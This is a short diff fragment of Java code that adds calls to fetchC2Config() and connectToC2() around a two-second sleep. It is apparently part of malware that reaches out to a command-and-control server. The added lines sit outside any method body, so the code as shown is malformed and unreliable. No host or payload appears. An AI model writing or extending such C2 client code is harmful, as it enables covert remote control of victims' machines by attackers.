@@ -31,3 +31,14 @@ private void fetchC2Config() {
         }
     }).start();
 }
+fetchC2Config();
+    
+    // Wait sebentar
+    try {
+        Thread.sleep(2000);
+    } catch (InterruptedException e) {
+        e.printStackTrace();
+    }
+    
+    // Then connect
+    connectToC2();
